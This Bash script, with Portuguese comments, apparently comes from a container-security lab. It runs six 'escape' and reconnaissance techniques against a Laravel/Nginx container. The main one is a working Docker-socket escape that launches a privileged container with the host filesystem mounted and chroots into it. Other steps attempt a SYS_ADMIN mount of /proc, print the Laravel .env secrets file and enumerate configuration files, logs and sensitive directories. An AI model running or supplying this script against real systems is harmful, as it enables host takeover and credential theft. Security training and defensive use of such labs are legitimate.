#!/bin/bash

# Container Escape Demo - MAQ-2 (Laravel)
# Este script demonstra técnicas de escape de container

set -e

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_header() {
    echo -e "${BLUE}"
    echo "=========================================="
    echo "  CONTAINER ESCAPE DEMO - MAQ-2 (LARAVEL)"
    echo "=========================================="
    echo -e "${NC}"
}

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Verificar se estamos dentro do container
check_container() {
    if [ -f /.dockerenv ]; then
        print_status "Executando dentro do container MAQ-2"
        return 0
    else
        print_error "Este script deve ser executado DENTRO do container"
        print_status "Use: docker exec -it maquina2-soc bash"
        exit 1
    fi
}

# Técnica 1: Docker Socket Escape
docker_socket_escape() {
    print_header
    print_status "Técnica 1: Escape via Docker Socket"
    echo
    
    if [ -S /var/run/docker.sock ]; then
        print_success "Docker socket encontrado em /var/run/docker.sock"
        
        # Verificar se docker CLI está disponível
        if command -v docker &> /dev/null; then
            print_status "Docker CLI disponível, tentando escape..."
            
            # Listar containers do host
            print_warning "Listando containers do host:"
            docker ps
            
            # Tentar criar container com acesso ao host
            print_warning "Criando container com acesso ao host..."
            docker run --rm -it --privileged -v /:/host ubuntu:latest chroot /host bash -c "
                echo 'ESCAPE BEM-SUCEDIDO!'
                echo 'Agora estamos no host com privilégios elevados'
                echo 'Hostname: ' \$(hostname)
                echo 'Usuário: ' \$(whoami)
                echo 'Processos: ' \$(ps aux | head -5)
            "
            
        else
            print_error "Docker CLI não disponível"
        fi
    else
        print_error "Docker socket não encontrado"
    fi
}

# Técnica 2: Capabilities Exploitation
capabilities_escape() {
    print_header
    print_status "Técnica 2: Exploiting Linux Capabilities"
    echo
    
    # Verificar capabilities
    print_status "Capabilities atuais:"
    cat /proc/self/status | grep Cap
    
    # SYS_ADMIN - Montar filesystems
    print_warning "Tentando montar /proc do host..."
    mkdir -p /tmp/host_proc 2>/dev/null || true
    mount -t proc none /tmp/host_proc 2>/dev/null && {
        print_success "Montagem de /proc bem-sucedida!"
        ls -la /tmp/host_proc/ | head -10
    } || print_error "Falha na montagem de /proc"
    
    # NET_ADMIN - Manipular rede
    print_warning "Tentando manipular interfaces de rede..."
    ip link show 2>/dev/null && {
        print_success "Acesso às interfaces de rede confirmado!"
        ip addr show
    } || print_error "Sem acesso às interfaces de rede"
}

# Técnica 3: Privileged Container Exploitation
privileged_escape() {
    print_header
    print_status "Técnica 3: Exploiting Privileged Container"
    echo
    
    # Verificar se estamos em modo privilegiado
    if [ -w /dev/mem ]; then
        print_success "Container em modo privilegiado detectado!"
        print_warning "Acesso direto à memória do host disponível"
    fi
    
    # Acessar informações do host
    print_status "Informações do host via /proc:"
    echo "Hostname: $(cat /proc/sys/kernel/hostname 2>/dev/null || echo 'N/A')"
    echo "Kernel: $(cat /proc/version 2>/dev/null || echo 'N/A')"
    
    # Verificar montagens
    print_status "Montagens do host:"
    cat /proc/mounts | grep -E "(proc|sys|dev)" | head -5
    
    # Verificar processos do host
    print_status "Processos do host (primeiros 5):"
    ps aux | head -6
}

# Técnica 4: Laravel Vulnerabilities
laravel_vulnerabilities() {
    print_header
    print_status "Técnica 4: Exploiting Laravel Vulnerabilities"
    echo
    
    # Verificar se Laravel está disponível
    if [ -f "/var/www/html/artisan" ]; then
        print_success "Laravel encontrado em /var/www/html"
        
        # Verificar arquivo .env
        if [ -f "/var/www/html/.env" ]; then
            print_warning "Arquivo .env encontrado e acessível:"
            cat /var/www/html/.env | head -10
        else
            print_error "Arquivo .env não encontrado"
        fi
        
        # Verificar permissões de storage
        print_status "Verificando permissões de storage:"
        ls -la /var/www/html/storage/
        
        # Verificar logs
        print_status "Logs do Laravel disponíveis:"
        ls -la /var/www/html/storage/logs/
        
        # Verificar uploads
        print_status "Diretório de uploads:"
        ls -la /var/www/html/storage/app/public/uploads/ 2>/dev/null || echo "Diretório não encontrado"
        
    else
        print_error "Laravel não encontrado"
    fi
}

# Técnica 5: Web Application Vulnerabilities
web_vulnerabilities() {
    print_header
    print_status "Técnica 5: Web Application Vulnerabilities"
    echo
    
    # Verificar se Nginx está rodando
    if pgrep -f "nginx" > /dev/null; then
        print_success "Nginx está rodando"
        
        # Verificar configuração
        print_status "Configuração do Nginx:"
        cat /etc/nginx/sites-available/default | grep -E "(location|allow|deny)" | head -10
        
        # Verificar logs
        print_status "Logs do Nginx:"
        ls -la /var/log/nginx/
        
        # Verificar se PHP-FPM está rodando
        if pgrep -f "php-fpm" > /dev/null; then
            print_success "PHP-FPM está rodando"
            
            # Verificar configuração do PHP
            print_status "Configuração do PHP (php.ini):"
            php --ini | head -5
            
            # Verificar extensões carregadas
            print_status "Extensões PHP carregadas:"
            php -m | grep -E "(curl|fileinfo|gd|mbstring|openssl|pdo|xml)" | head -10
            
        else
            print_error "PHP-FPM não está rodando"
        fi
        
    else
        print_error "Nginx não está rodando"
    fi
}

# Técnica 6: File System Access
filesystem_access() {
    print_header
    print_status "Técnica 6: File System Access"
    echo
    
    # Verificar diretórios sensíveis
    print_status "Verificando diretórios sensíveis:"
    
    local sensitive_dirs=("/etc" "/var/log" "/home" "/opt" "/tmp" "/var/www/html")
    for dir in "${sensitive_dirs[@]}"; do
        if [ -d "$dir" ]; then
            echo "✅ $dir: $(ls -la "$dir" | wc -l) arquivos"
        else
            echo "❌ $dir: não encontrado"
        fi
    done
    
    # Verificar arquivos de configuração
    print_status "Arquivos de configuração sensíveis:"
    find /etc -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -10
    
    # Verificar arquivos de log
    print_status "Arquivos de log disponíveis:"
    find /var/log -name "*.log" 2>/dev/null | head -10
}

# Menu principal
main() {
    case "${1:-all}" in
        "docker")
            docker_socket_escape
            ;;
        "capabilities")
            capabilities_escape
            ;;
        "privileged")
            privileged_escape
            ;;
        "laravel")
            laravel_vulnerabilities
            ;;
        "web")
            web_vulnerabilities
            ;;
        "filesystem")
            filesystem_access
            ;;
        "all")
            docker_socket_escape
            echo
            capabilities_escape
            echo
            privileged_escape
            echo
            laravel_vulnerabilities
            echo
            web_vulnerabilities
            echo
            filesystem_access
            ;;
        *)
            echo "Uso: $0 [docker|capabilities|privileged|laravel|web|filesystem|all]"
            echo
            echo "Técnicas disponíveis:"
            echo "  docker      - Escape via Docker socket"
            echo "  capabilities - Exploiting Linux capabilities"
            echo "  privileged  - Exploiting privileged container"
            echo "  laravel     - Exploiting Laravel vulnerabilities"
            echo "  web         - Web application vulnerabilities"
            echo "  filesystem  - File system access"
            echo "  all         - Executar todas as técnicas"
            exit 1
            ;;
    esac
}

# Executar
main "$@"
